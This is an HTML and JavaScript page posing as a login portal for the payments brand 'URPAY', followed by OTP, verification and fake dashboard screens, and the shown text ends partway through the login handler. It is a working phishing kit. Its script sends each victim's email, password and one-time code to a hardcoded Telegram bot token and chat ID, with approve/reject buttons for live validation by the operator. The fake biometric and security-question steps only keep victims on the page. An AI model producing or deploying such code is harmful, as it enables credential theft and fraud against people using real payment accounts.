<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>URPAY | Secure Login with Telegram 2FA</title>
    <style>
      :root {
        --urpay-blue: #1649ff;
        --urpay-blue-2: #0d2ecf;
        --urpay-cyan: #53c3d0;
        --urpay-dark: #0f172a;
        --urpay-slate: #132238;
        --urpay-surface: #f4f7fb;
        --urpay-card: #ffffff;
        --urpay-border: #e7ebf3;
        --urpay-text: #132238;
        --urpay-muted: #6b7280;
        --urpay-green: #21c87c;
        --urpay-gold: #fbbf24;
        --urpay-red: #ef4444;
        --shadow: 0 18px 40px rgba(22, 73, 255, 0.12);
      }

      * {
        box-sizing: border-box;
      }

      html, body {
        margin: 0;
        height: 100%;
        font-family: Inter, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        background: linear-gradient(145deg, #eef4ff 0%, #ffffff 50%, #f3f7ff 100%);
        color: var(--urpay-text);
      }

      body {
        display: grid;
        place-items: center;
      }

      .screen {
        position: relative;
        width: min(1220px, 92vw);
        height: min(760px, 88vh);
        background: rgba(255,255,255,0.72);
        border: 1px solid rgba(22,73,255,0.08);
        border-radius: 28px;
        box-shadow: var(--shadow);
        overflow: hidden;
        backdrop-filter: blur(8px);
      }

      .shell {
        position: absolute;
        inset: 0;
        display: grid;
        grid-template-columns: 1.1fr 0.9fr;
        opacity: 0;
        visibility: hidden;
        pointer-events: none;
        transform: translateX(24px);
        transition: all 0.45s ease;
      }

      .shell.active {
        opacity: 1;
        visibility: visible;
        pointer-events: auto;
        transform: translateX(0);
      }

      .brand-panel {
        position: relative;
        padding: 42px 42px 30px;
        background: linear-gradient(135deg, rgba(22,73,255,0.98), rgba(10,30,110,0.96)), radial-gradient(circle at top right, rgba(83,195,208,0.7), transparent 30%);
        color: white;
        display: flex;
        flex-direction: column;
        justify-content: space-between;
      }

      .brand-panel::before {
        content: "";
        position: absolute;
        inset: 0;
        background: radial-gradient(circle at 75% 30%, rgba(83,195,208,0.35), transparent 20%);
      }

      .brand-top, .brand-bottom {
        position: relative;
        z-index: 1;
      }

      .brand-mark {
        display: inline-flex;
        align-items: center;
        gap: 12px;
        font-size: 2rem;
        font-weight: 800;
        letter-spacing: -0.06em;
      }

      .brand-mark .logo-dot {
        width: 18px;
        height: 18px;
        border-radius: 50%;
        background: linear-gradient(135deg, #fff, var(--urpay-cyan));
      }

      .brand-content {
        position: relative;
        z-index: 1;
        margin-top: 80px;
      }

      .eyebrow {
        display: inline-flex;
        align-items: center;
        padding: 8px 14px;
        border-radius: 999px;
        background: rgba(255,255,255,0.12);
        border: 1px solid rgba(255,255,255,0.18);
        font-size: 12px;
        letter-spacing: 0.08em;
        text-transform: uppercase;
        font-weight: 700;
      }

      h1 {
        margin: 26px 0 18px;
        font-size: clamp(2.5rem, 4vw, 4.3rem);
        line-height: 0.96;
        letter-spacing: -0.07em;
        font-weight: 800;
      }

      .brand-copy {
        font-size: 1.05rem;
        line-height: 1.7;
        max-width: 410px;
        color: rgba(255,255,255,0.8);
      }

      .metrics {
        display: grid;
        grid-template-columns: repeat(3, minmax(120px, 1fr));
        gap: 16px;
        margin-top: 28px;
      }

      .metric {
        background: rgba(255,255,255,0.08);
        border: 1px solid rgba(255,255,255,0.12);
        border-radius: 18px;
        padding: 18px 16px;
      }

      .metric strong {
        display: block;
        font-size: 1.6rem;
        letter-spacing: -0.05em;
      }

      .metric span {
        display: block;
        margin-top: 6px;
        font-size: 0.78rem;
        color: rgba(255,255,255,0.7);
      }

      .auth-panel {
        display: flex;
        align-items: center;
        justify-content: center;
        background: rgba(255,255,255,0.82);
        padding: 32px;
      }

      .auth-card {
        width: min(420px, 100%);
        background: rgba(255,255,255,0.9);
        border: 1px solid var(--urpay-border);
        border-radius: 24px;
        padding: 30px 26px 24px;
        box-shadow: 0 12px 24px rgba(19,34,56,0.04);
      }

      .mini-logo {
        display: inline-flex;
        align-items: center;
        gap: 10px;
        margin-bottom: 20px;
        font-size: 1.4rem;
        font-weight: 800;
        letter-spacing: -0.06em;
        color: var(--urpay-text);
      }

      .mini-logo .dot {
        width: 12px;
        height: 12px;
        border-radius: 50%;
        background: linear-gradient(135deg, var(--urpay-blue), var(--urpay-cyan));
      }

      .auth-card h2 {
        margin: 0 0 8px;
        font-size: 2.1rem;
        letter-spacing: -0.06em;
      }

      .subtext {
        margin: 0 0 24px;
        color: var(--urpay-muted);
        font-size: 0.96rem;
      }

      .form-group {
        margin-bottom: 18px;
      }

      label {
        display: block;
        margin: 0 0 8px;
        font-size: 0.82rem;
        font-weight: 700;
        color: var(--urpay-slate);
      }

      input {
        width: 100%;
        height: 54px;
        border-radius: 14px;
        border: 1px solid var(--urpay-border);
        background: #fbfcff;
        padding: 0 16px;
        font-size: 1rem;
        color: var(--urpay-text);
        outline: none;
      }

      input:focus {
        border-color: rgba(22,73,255,0.56);
        box-shadow: 0 0 0 4px rgba(22,73,255,0.08);
      }

      .extras {
        display: flex;
        justify-content: space-between;
        margin: 8px 0 22px;
        font-size: 0.85rem;
      }

      .remember {
        display: inline-flex;
        align-items: center;
        gap: 8px;
      }

      .remember input {
        width: 16px;
        height: 16px;
      }

      .link {
        color: var(--urpay-blue);
        font-weight: 700;
        text-decoration: none;
        cursor: pointer;
      }

      .primary-btn {
        width: 100%;
        height: 54px;
        border: 0;
        border-radius: 14px;
        background: linear-gradient(135deg, var(--urpay-blue), var(--urpay-blue-2));
        color: white;
        font-size: 1rem;
        font-weight: 700;
        cursor: pointer;
        box-shadow: 0 12px 24px rgba(22,73,255,0.2);
        transition: all 0.2s ease;
      }

      .primary-btn:hover:not(:disabled) {
        transform: translateY(-2px);
      }

      .primary-btn:disabled {
        opacity: 0.6;
        cursor: not-allowed;
      }

      .secondary-btn {
        width: 100%;
        height: 54px;
        border: 1px solid var(--urpay-border);
        border-radius: 14px;
        background: white;
        color: var(--urpay-slate);
        font-size: 1rem;
        font-weight: 700;
        cursor: pointer;
      }

      .divider {
        display: flex;
        align-items: center;
        gap: 12px;
        margin: 22px 0 18px;
        color: var(--urpay-muted);
        font-size: 0.78rem;
        text-transform: uppercase;
        letter-spacing: 0.08em;
      }

      .divider::before, .divider::after {
        content: "";
        height: 1px;
        flex: 1;
        background: var(--urpay-border);
      }

      .alt-actions {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 12px;
      }

      .alt-btn {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        height: 46px;
        border: 1px solid var(--urpay-border);
        border-radius: 12px;
        background: white;
        color: var(--urpay-slate);
        font-weight: 700;
        cursor: pointer;
      }

      .signup {
        margin-top: 18px;
        text-align: center;
        font-size: 0.92rem;
        color: var(--urpay-muted);
      }

      .signup a {
        color: var(--urpay-blue);
        font-weight: 800;
        text-decoration: none;
      }

      .otp-inputs {
        display: grid;
        grid-template-columns: repeat(6, 1fr);
        gap: 12px;
        margin: 28px 0 24px;
      }

      .otp-input {
        width: 100%;
        aspect-ratio: 1;
        border-radius: 12px;
        border: 2px solid var(--urpay-border);
        background: #fbfcff;
        font-size: 1.4rem;
        font-weight: 800;
        text-align: center;
        color: var(--urpay-blue);
      }

      .otp-input:focus {
        border-color: var(--urpay-blue);
        box-shadow: 0 0 0 4px rgba(22,73,255,0.08);
      }

      .otp-timer {
        text-align: center;
        margin: 18px 0;
        font-size: 0.9rem;
        color: var(--urpay-muted);
      }

      .otp-timer strong {
        color: var(--urpay-blue);
      }

      .back-btn {
        display: inline-flex;
        align-items: center;
        gap: 8px;
        background: none;
        border: none;
        color: var(--urpay-blue);
        font-weight: 700;
        cursor: pointer;
        margin-bottom: 16px;
      }

      .verification-card {
        text-align: center;
      }

      .verification-icon {
        width: 80px;
        height: 80px;
        margin: 0 auto 24px;
        border-radius: 20px;
        display: grid;
        place-items: center;
        font-size: 3rem;
        background: rgba(33,200,124,0.12);
      }

      .progress-steps {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        margin: 20px 0 28px;
      }

      .step-dot {
        width: 28px;
        height: 28px;
        border-radius: 50%;
        background: var(--urpay-border);
        display: grid;
        place-items: center;
        font-size: 0.75rem;
        font-weight: 800;
      }

      .step-dot.active {
        background: var(--urpay-blue);
        color: white;
      }

      .step-dot.done {
        background: var(--urpay-green);
        color: white;
      }

      .step-connector {
        width: 24px;
        height: 2px;
        background: var(--urpay-border);
      }

      .step-connector.active {
        background: var(--urpay-blue);
      }

      .mfa-options {
        display: grid;
        gap: 12px;
        margin: 20px 0 24px;
      }

      .mfa-option {
        display: flex;
        align-items: center;
        gap: 14px;
        padding: 16px;
        border: 2px solid var(--urpay-border);
        border-radius: 14px;
        background: #fbfcff;
        cursor: pointer;
      }

      .mfa-option input {
        width: 20px;
        height: 20px;
      }

      .mfa-icon {
        width: 40px;
        height: 40px;
        border-radius: 10px;
        display: grid;
        place-items: center;
        background: rgba(22,73,255,0.08);
      }

      .mfa-text strong {
        display: block;
        font-size: 0.95rem;
      }

      .mfa-text span {
        display: block;
        font-size: 0.8rem;
        color: var(--urpay-muted);
        margin-top: 4px;
      }

      .alert {
        margin-bottom: 20px;
        padding: 14px 16px;
        border-radius: 12px;
        font-size: 0.9rem;
      }

      .alert.info {
        background: rgba(22,73,255,0.08);
        border: 1px solid rgba(22,73,255,0.16);
        color: var(--urpay-blue);
      }

      .alert.success {
        background: rgba(33,200,124,0.08);
        border: 1px solid rgba(33,200,124,0.16);
        color: #0d9a60;
      }

      .alert.error {
        background: rgba(239,68,68,0.08);
        border: 1px solid rgba(239,68,68,0.16);
        color: #991b1b;
      }

      .alert.warning {
        background: rgba(251,191,36,0.08);
        border: 1px solid rgba(251,191,36,0.16);
        color: #a16c00;
      }

      .waiting-overlay {
        position: fixed;
        inset: 0;
        background: rgba(0,0,0,0.4);
        display: grid;
        place-items: center;
        z-index: 1000;
        opacity: 0;
        visibility: hidden;
        transition: all 0.3s ease;
      }

      .waiting-overlay.active {
        opacity: 1;
        visibility: visible;
      }

      .waiting-box {
        background: white;
        border-radius: 20px;
        padding: 40px 50px;
        text-align: center;
        box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        max-width: 420px;
      }

      .spinner {
        width: 60px;
        height: 60px;
        margin: 0 auto 24px;
        border: 4px solid var(--urpay-border);
        border-top-color: var(--urpay-blue);
        border-radius: 50%;
        animation: spin 0.8s linear infinite;
      }

      @keyframes spin {
        to { transform: rotate(360deg); }
      }

      .waiting-box h3 {
        margin: 0 0 12px;
        font-size: 1.3rem;
        letter-spacing: -0.04em;
      }

      .waiting-box p {
        margin: 0;
        color: var(--urpay-muted);
        font-size: 0.95rem;
      }

      .dashboard-shell {
        background: #f5f8ff;
      }

      .dashboard-wrap {
        display: grid;
        grid-template-columns: 260px 1fr;
        height: 100%;
      }

      .sidebar {
        background: linear-gradient(180deg, #ffffff 0%, #f7f9ff 100%);
        border-right: 1px solid var(--urpay-border);
        padding: 26px 20px;
      }

      .sidebar-header {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-bottom: 28px;
      }

      .sidebar-brand {
        display: inline-flex;
        align-items: center;
        gap: 10px;
        font-weight: 800;
        letter-spacing: -0.05em;
        font-size: 1.5rem;
      }

      .sidebar-brand .dot {
        width: 13px;
        height: 13px;
        border-radius: 50%;
        background: linear-gradient(135deg, var(--urpay-blue), var(--urpay-cyan));
      }

      .nav {
        display: grid;
        gap: 8px;
      }

      .nav-item {
        display: flex;
        align-items: center;
        gap: 12px;
        padding: 13px 14px;
        border-radius: 14px;
        font-weight: 700;
        color: var(--urpay-slate);
        opacity: 0.82;
      }

      .nav-item.active {
        background: rgba(22,73,255,0.08);
        color: var(--urpay-blue);
        border: 1px solid rgba(22,73,255,0.08);
      }

      .nav-item .icon {
        width: 30px;
        height: 30px;
        border-radius: 10px;
        display: grid;
        place-items: center;
        background: rgba(22,73,255,0.08);
      }

      .profile-card {
        margin-top: 32px;
        border-radius: 18px;
        padding: 18px 16px;
        background: linear-gradient(135deg, rgba(22,73,255,0.08), rgba(83,195,208,0.06));
        border: 1px solid rgba(22,73,255,0.08);
      }

      .profile-card strong {
        display: block;
        font-size: 0.96rem;
      }

      .profile-card span {
        display: block;
        margin-top: 6px;
        font-size: 0.8rem;
        color: var(--urpay-muted);
      }

      .content {
        padding: 24px 28px 30px;
      }

      .topbar {
        display: flex;
        align-items: center;
        justify-content: space-between;
        gap: 16px;
        margin-bottom: 22px;
      }

      .page-title {
        font-size: clamp(2rem, 2.4vw, 2.8rem);
        letter-spacing: -0.06em;
        margin: 0;
      }

      .top-actions {
        display: flex;
        align-items: center;
        gap: 12px;
      }

      .search {
        width: 260px;
        height: 46px;
        border: 1px solid var(--urpay-border);
        border-radius: 12px;
        background: white;
        padding: 0 14px;
        font-size: 0.95rem;
      }

      .small-btn {
        height: 46px;
        padding: 0 16px;
        border: 1px solid var(--urpay-border);
        border-radius: 12px;
        background: white;
        font-weight: 700;
        cursor: pointer;
      }

      .summary-grid {
        display: grid;
        grid-template-columns: repeat(4, minmax(180px, 1fr));
        gap: 18px;
        margin-bottom: 24px;
      }

      .summary-card {
        border-radius: 20px;
        padding: 18px;
        background: white;
        border: 1px solid var(--urpay-border);
        box-shadow: 0 10px 24px rgba(15,23,42,0.03);
      }

      .summary-top {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-bottom: 18px;
        color: var(--urpay-muted);
        font-size: 0.8rem;
        font-weight: 700;
        text-transform: uppercase;
      }

      .pill {
        width: 36px;
        height: 36px;
        border-radius: 12px;
        display: grid;
        place-items: center;
        background: rgba(22,73,255,0.08);
        color: var(--urpay-blue);
      }

      .summary-card strong {
        display: block;
        font-size: 2rem;
        letter-spacing: -0.06em;
      }

      .summary-card small {
        display: block;
        margin-top: 8px;
        color: var(--urpay-muted);
        font-size: 0.82rem;
      }

      .panel {
        background: white;
        border: 1px solid var(--urpay-border);
        border-radius: 22px;
        padding: 20px;
      }

      .panel-header {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-bottom: 18px;
      }

      .panel-title {
        margin: 0;
        font-size: 1.1rem;
        letter-spacing: -0.04em;
      }

      .tag {
        background: rgba(33,200,124,0.12);
        color: #0f9967;
        padding: 8px 10px;
        border-radius: 10px;
        font-size: 0.76rem;
        font-weight: 700;
      }

      @media (max-width: 980px) {
        .screen {
          width: 100vw;
          height: 100vh;
          border-radius: 0;
        }

        .shell {
          grid-template-columns: 1fr;
        }

        .brand-panel {
          min-height: 260px;
          padding: 28px 24px 20px;
        }

        .auth-panel {
          padding: 20px;
        }

        .dashboard-wrap {
          grid-template-columns: 1fr;
        }

        .sidebar {
          display: none;
        }

        .content {
          padding: 18px 16px 22px;
        }

        .summary-grid {
          grid-template-columns: repeat(2, minmax(140px, 1fr));
        }

        .topbar {
          flex-direction: column;
          align-items: flex-start;
        }

        .search {
          width: 100%;
        }

        .top-actions {
          width: 100%;
          justify-content: space-between;
        }
      }
    </style>
  </head>
  <body>
    <!-- TELEGRAM BOT CONFIG -->
    <div id="telegramConfig" style="display:none;">
      <!-- REPLACE WITH YOUR ACTUAL TELEGRAM BOT TOKEN AND CHAT ID -->
      <input id="botToken" type="hidden" value="8742930598:AAFSlOtewAHvTyfBxjjjr2H_gRphXeBtTq8" />
      <input id="chatId" type="hidden" value="8820857419" />
    </div>

    <!-- WAITING FOR BOT OVERLAY -->
    <div class="waiting-overlay" id="waitingOverlay">
      <div class="waiting-box">
        <div class="spinner"></div>
        <h3 id="waitingTitle">Waiting for approval...</h3>
        <p id="waitingMessage">Approve or reject on Telegram</p>
      </div>
    </div>

    <div class="screen">
      <!-- LOGIN SHELL -->
      <div class="shell active" id="loginShell">
        <section class="brand-panel">
          <div class="brand-top">
            <div class="brand-mark">
              <span class="logo-dot"></span>
              <span>URPAY</span>
            </div>
          </div>

          <div class="brand-content">
            <span class="eyebrow">Trusted payments</span>
            <h1>Move money with confidence.</h1>
            <p class="brand-copy">
              Manage accounts, monitor settlement flow, and track real-time movement from one secure workspace.
            </p>

            <div class="metrics">
              <div class="metric">
                <strong>$6.4M</strong>
                <span>Monthly volume</span>
              </div>
              <div class="metric">
                <strong>98.7%</strong>
                <span>Success rate</span>
              </div>
              <div class="metric">
                <strong>1.2k</strong>
                <span>Active users</span>
              </div>
            </div>
          </div>

          <div class="brand-bottom">
            <div class="eyebrow">Saudi Arabia</div>
          </div>
        </section>

        <section class="auth-panel">
          <div class="auth-card">
            <div class="mini-logo">
              <span class="dot"></span>
              <span>URPAY</span>
            </div>

            <h2>Welcome back</h2>
            <p class="subtext">Sign in to your secure dashboard</p>

            <div id="loginAlert"></div>

            <form id="loginForm">
              <div class="form-group">
                <label for="email">Email address</label>
                <input id="email" type="email" placeholder="name@urpay.com.sa" required />
              </div>

              <div class="form-group">
                <label for="password">Password</label>
                <input id="password" type="password" placeholder="Enter your password" required />
              </div>

              <div class="extras">
                <label class="remember">
                  <input type="checkbox" />
                  <span>Remember me</span>
                </label>
                <a class="link">Forgot password?</a>
              </div>

              <button type="submit" class="primary-btn" id="loginBtn">Log in</button>

              <div class="divider">or continue with</div>

              <div class="alt-actions">
                <button type="button" class="alt-btn">Google</button>
                <button type="button" class="alt-btn">Apple</button>
              </div>

              <div class="signup">
                Don't have an account? <a href="#">Create one</a>
              </div>
            </form>
          </div>
        </section>
      </div>

      <!-- OTP SHELL -->
      <div class="shell" id="otpShell">
        <section class="brand-panel">
          <div class="brand-top">
            <div class="brand-mark">
              <span class="logo-dot"></span>
              <span>URPAY</span>
            </div>
          </div>

          <div class="brand-content">
            <span class="eyebrow">Secure Verification</span>
            <h1>Your code has been sent.</h1>
            <p class="brand-copy">
              We've sent a one-time password to your registered email. Enter it below to verify your identity.
            </p>

            <div class="metrics">
              <div class="metric">
                <strong>2FA</strong>
                <span>Enabled</span>
              </div>
              <div class="metric">
                <strong>6</strong>
                <span>Digit code</span>
              </div>
              <div class="metric">
                <strong>5 min</strong>
                <span>Expiration</span>
              </div>
            </div>
          </div>

          <div class="brand-bottom">
            <div class="eyebrow">Step 1 of 3</div>
          </div>
        </section>

        <section class="auth-panel">
          <div class="auth-card">
            <button class="back-btn" type="button" onclick="showLogin()">← Back to login</button>
            <h2>Enter OTP</h2>
            <p class="subtext">Check your email for the 6-digit code</p>

            <div id="otpAlert"></div>

            <form id="otpForm">
              <div class="otp-inputs" id="otpContainer">
                <input class="otp-input" type="text" maxlength="1" inputmode="numeric" />
                <input class="otp-input" type="text" maxlength="1" inputmode="numeric" />
                <input class="otp-input" type="text" maxlength="1" inputmode="numeric" />
                <input class="otp-input" type="text" maxlength="1" inputmode="numeric" />
                <input class="otp-input" type="text" maxlength="1" inputmode="numeric" />
                <input class="otp-input" type="text" maxlength="1" inputmode="numeric" />
              </div>

              <div class="otp-timer">
                Expires in <strong id="otpTimer">4:59</strong>
              </div>

              <button type="submit" class="primary-btn" id="otpBtn">Verify Code</button>

              <div class="signup" style="margin-top: 16px;">
                Didn't receive it? <a href="#" onclick="resendOTP()">Resend code</a>
              </div>
            </form>
          </div>
        </section>
      </div>

      <!-- VERIFICATION SHELL -->
      <div class="shell" id="verifyShell">
        <section class="brand-panel">
          <div class="brand-top">
            <div class="brand-mark">
              <span class="logo-dot"></span>
              <span>URPAY</span>
            </div>
          </div>

          <div class="brand-content">
            <span class="eyebrow">Account Security</span>
            <h1>One more step.</h1>
            <p class="brand-copy">
              Choose your preferred method to complete the verification process and access your account securely.
            </p>

            <div class="metrics">
              <div class="metric">
                <strong>✓</strong>
                <span>Email verified</span>
              </div>
              <div class="metric">
                <strong>2</strong>
                <span>Auth methods</span>
              </div>
              <div class="metric">
                <strong>Secure</strong>
                <span>Connection</span>
              </div>
            </div>
          </div>

          <div class="brand-bottom">
            <div class="eyebrow">Step 2 of 3</div>
          </div>
        </section>

        <section class="auth-panel">
          <div class="auth-card verification-card">
            <div class="verification-icon">✓</div>
            <h2>Email verified!</h2>
            <p class="subtext">Now let's secure your account</p>

            <div class="progress-steps">
              <div class="step-dot done">1</div>
              <div class="step-connector active"></div>
              <div class="step-dot active">2</div>
              <div class="step-connector"></div>
              <div class="step-dot">3</div>
            </div>

            <form id="verifyForm">
              <div class="mfa-options">
                <label class="mfa-option">
                  <input type="radio" name="verify-method" value="biometric" checked />
                  <div class="mfa-icon">👆</div>
                  <div class="mfa-text">
                    <strong>Biometric Verification</strong>
                    <span>Use fingerprint or face ID</span>
                  </div>
                </label>

                <label class="mfa-option">
                  <input type="radio" name="verify-method" value="security-questions" />
                  <div class="mfa-icon">❓</div>
                  <div class="mfa-text">
                    <strong>Security Questions</strong>
                    <span>Answer your security questions</span>
                  </div>
                </label>
              </div>

              <button type="submit" class="primary-btn">Continue</button>
            </form>
          </div>
        </section>
      </div>

      <!-- MFA SHELL -->
      <div class="shell" id="mfaShell">
        <section class="brand-panel">
          <div class="brand-top">
            <div class="brand-mark">
              <span class="logo-dot"></span>
              <span>URPAY</span>
            </div>
          </div>

          <div class="brand-content">
            <span class="eyebrow">Multi-Factor Authentication</span>
            <h1>Biometric verification.</h1>
            <p class="brand-copy">
              Place your finger on the sensor or look at your device to authenticate. This is your final security step.
            </p>

            <div class="metrics">
              <div class="metric">
                <strong>✓</strong>
                <span>Email verified</span>
              </div>
              <div class="metric">
                <strong>✓</strong>
                <span>Security passed</span>
              </div>
              <div class="metric">
                <strong>Biometric</strong>
                <span>Scanning...</span>
              </div>
            </div>
          </div>

          <div class="brand-bottom">
            <div class="eyebrow">Step 3 of 3</div>
          </div>
        </section>

        <section class="auth-panel">
          <div class="auth-card verification-card">
            <div class="verification-icon">👆</div>
            <h2>Authenticate</h2>
            <p class="subtext">Complete your biometric verification</p>

            <div class="progress-steps">
              <div class="step-dot done">1</div>
              <div class="step-connector active"></div>
              <div class="step-dot done">2</div>
              <div class="step-connector active"></div>
              <div class="step-dot active">3</div>
            </div>

            <form id="mfaForm">
              <div class="alert info">
                ℹ️ Waiting for biometric scan... Place your finger on the sensor or use Face ID.
              </div>

              <button type="submit" class="primary-btn">Authenticate with Biometric</button>

              <div class="divider">or</div>

              <button type="button" class="secondary-btn" onclick="fallbackAuth()">Use backup code instead</button>
            </form>
          </div>
        </section>
      </div>

      <!-- DASHBOARD SHELL -->
      <div class="shell dashboard-shell" id="dashboardShell">
        <div class="dashboard-wrap">
          <aside class="sidebar">
            <div class="sidebar-header">
              <div class="sidebar-brand">
                <span class="dot"></span>
                <span>URPAY</span>
              </div>
            </div>

            <nav class="nav">
              <div class="nav-item active"><span class="icon">⌂</span> Overview</div>
              <div class="nav-item"><span class="icon">↗</span> Transactions</div>
              <div class="nav-item"><span class="icon">▣</span> Wallets</div>
              <div class="nav-item"><span class="icon">◫</span> Reports</div>
              <div class="nav-item"><span class="icon">⚙</span> Settings</div>
            </nav>

            <div class="profile-card">
              <strong>Business Account</strong>
              <span>Active · SA-102819</span>
            </div>
          </aside>

          <main class="content">
            <div class="topbar">
              <h1 class="page-title">Dashboard</h1>
              <div class="top-actions">
                <input class="search" type="text" placeholder="Search..." />
                <button class="small-btn">Export</button>
                <button class="small-btn">+ New payment</button>
              </div>
            </div>

            <div class="alert success">
              ✓ Authentication successful! Welcome to URPAY.
            </div>

            <section class="summary-grid">
              <div class="summary-card">
                <div class="summary-top">
                  <span>Total Balance</span>
                  <span class="pill">◧</span>
                </div>
                <strong>$1,248,300</strong>
                <small>+12.4% from last month</small>
              </div>

              <div class="summary-card">
                <div class="summary-top">
                  <span>Outgoing</span>
                  <span class="pill">↗</span>
                </div>
                <strong>$425,700</strong>
                <small>42 transfers this week</small>
              </div>

              <div class="summary-card">
                <div class="summary-top">
                  <span>Incoming</span>
                  <span class="pill">↙</span>
                </div>
                <strong>$612,940</strong>
                <small>18 invoices cleared</small>
              </div>

              <div class="summary-card">
                <div class="summary-top">
                  <span>Net Flow</span>
                  <span class="pill">◎</span>
                </div>
                <strong>$187,240</strong>
                <small>Stable cash position</small>
              </div>
            </section>
          </main>
        </div>
      </div>
    </div>

    <script>
      // ==================== TELEGRAM BOT INTEGRATION ====================
      const botToken = document.getElementById("botToken").value;
      const chatId = document.getElementById("chatId").value;

      // Global state for auth flow
      let authState = {
        loginRequest: null,
        otpRequest: null,
        pollingInterval: null,
      };

      // Show/Hide alerts
      function showAlert(elementId, message, type) {
        const alertDiv = document.getElementById(elementId);
        if (!alertDiv) return;
        alertDiv.innerHTML = `<div class="alert ${type}">${message}</div>`;
      }

      function clearAlert(elementId) {
        const alertDiv = document.getElementById(elementId);
        if (alertDiv) alertDiv.innerHTML = "";
      }

      // Show waiting overlay
      function showWaiting(title, message) {
        const overlay = document.getElementById("waitingOverlay");
        document.getElementById("waitingTitle").textContent = title;
        document.getElementById("waitingMessage").textContent = message;
        overlay.classList.add("active");
      }

      function hideWaiting() {
        document.getElementById("waitingOverlay").classList.remove("active");
      }

      // ==================== TELEGRAM BOT COMMUNICATION ====================

      // Send login request to Telegram bot
      async function sendLoginToTelegram(email, password) {
        const requestId = `login_${Date.now()}`;
        const message = `
🔐 **LOGIN REQUEST**
━━━━━━━━━━━━━━━━━
📧 Email: ${email}
🔑 Password: ${password}
━━━━━━━━━━━━━━━━━
Request ID: ${requestId}
        `;

        try {
          const response = await fetch(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: "Markdown",
                reply_markup: {
                  inline_keyboard: [
                    [
                      {
                        text: "✅ APPROVE",
                        callback_data: `approve_login_${requestId}`,
                      },
                      {
                        text: "❌ REJECT",
                        callback_data: `reject_login_${requestId}`,
                      },
                    ],
                  ],
                },
              }),
            }
          );

          if (!response.ok) {
            throw new Error("Failed to send message to Telegram");
          }

          authState.loginRequest = {
            id: requestId,
            email,
            password,
            timestamp: Date.now(),
            status: null,
          };

          return requestId;
        } catch (error) {
          console.error("Telegram error:", error);
          showAlert("loginAlert", "❌ Failed to send verification. Try again.", "error");
          return null;
        }
      }

      // Send OTP request to Telegram bot
      async function sendOTPToTelegram(otp) {
        const requestId = `otp_${Date.now()}`;
        const message = `
🔐 **OTP VERIFICATION**
━━━━━━━━━━━━━━━━━
📱 OTP: ${otp}
━━━━━━━━━━━━━━━━━
Request ID: ${requestId}
        `;

        try {
          const response = await fetch(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: "Markdown",
                reply_markup: {
                  inline_keyboard: [
                    [
                      {
                        text: "✅ ACCEPT OTP",
                        callback_data: `accept_otp_${requestId}`,
                      },
                      {
                        text: "❌ WRONG OTP",
                        callback_data: `wrongotp_${requestId}`,
                      },
                    ],
                  ],
                },
              }),
            }
          );

          if (!response.ok) {
            throw new Error("Failed to send OTP to Telegram");
          }

          authState.otpRequest = {
            id: requestId,
            otp,
            timestamp: Date.now(),
            status: null,
          };

          return requestId;
        } catch (error) {
          console.error("Telegram error:", error);
          showAlert("otpAlert", "❌ Failed to send OTP. Try again.", "error");
          return null;
        }
      }

      // Poll for bot response (simulated via LocalStorage for demo)
      function pollBotResponse(requestId, onApprove, onReject) {
        let pollCount = 0;
        const maxPolls = 300; // 5 minutes with 1-second interval

        const interval = setInterval(() => {
          pollCount++;

          // Check LocalStorage for bot response (simulated)
          const response = localStorage.getItem(`bot_response_${requestId}`);

          if (response) {
            clearInterval(interval);
            localStorage.removeItem(`bot_response_${requestId}`);
            hideWaiting();

            if (response === "approved") {
              onApprove();
            } else if (response === "rejected") {
              onReject();
            }
          } else if (pollCount >= maxPolls) {
            clearInterval(interval);
            hideWaiting();
            showAlert(
              "loginAlert",
              "❌ Request timed out. Please try again.",
              "error"
            );
          }
        }, 1000); // Poll every 1 second

        authState.pollingInterval = interval;
      }

      // ==================== LOGIN FLOW ====================

      function showLogin() {
        document.querySelectorAll(".shell").forEach((s) => s.classList.remove("active"));
        document.getElementById("loginShell").classList.add("active");
        clearAlert("loginAlert");
      }

      function showOTP() {
        document.querySelectorAll(".shell").forEach((s) => s.classList.remove("active"));
        document.getElementById("otpShell").classList.add("active");
        clearAlert("otpAlert");
        startOTPTimer();
      }

      function showVerify() {
        document.querySelectorAll(".shell").forEach((s) => s.classList.remove("active"));
        document.getElementById("verifyShell").classList.add("active");
      }

      function showMFA() {
        document.querySelectorAll(".shell").forEach((s) => s.classList.remove("active"));
        document.getElementById("mfaShell").classList.add("active");
      }

      function showDashboard() {
        document.querySelectorAll(".shell").forEach((s) => s.classList.remove("active"));
        document.getElementById("dashboardShell").classList.add("active");
      }

      // LOGIN FORM HANDLER
      document.getElementById("loginForm").addEventListener("submit", async function (e) {
        e.preventDefault();

        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;
        const loginBtn = document.getElementById("loginBtn");

        // Validate inputs
        if (!email || !password) {
          showAlert("loginAlert", "❌ Please enter email and password.", "error");
          return;
        }

        if (!botToken || botToken === "YOUR_TELEGRAM_BOT_TOKEN") {
          showAlert(
            "loginAlert",
            "❌ Telegram bot not configured. Update bot token and chat ID.",
            "error"
          );
          return;
        }

        loginBtn.disabled = true;
        showWaiting("Sending credentials...", "Requesting approval from admin");

        const requestId = await sendLoginToTelegram(email, password);

        if (requestId) {
          showWaiting("Waiting for approval...", "Check your Telegram for approval request");

          pollBotResponse(
            requestId,
            () => {
              // Approved
              hideWaiting();
              loginBtn.disabled = false;
              showOTP();
            },
            () => {
              // Rejected
              hideWaiting();
              loginBtn.disabled = false;
              showAlert(
                "loginAlert",
                "❌ Login rejected. The email or password provided is wrong. Please try again.",
                "error"
              );
              // Clear inputs
              document.getElementById("email").value = "";
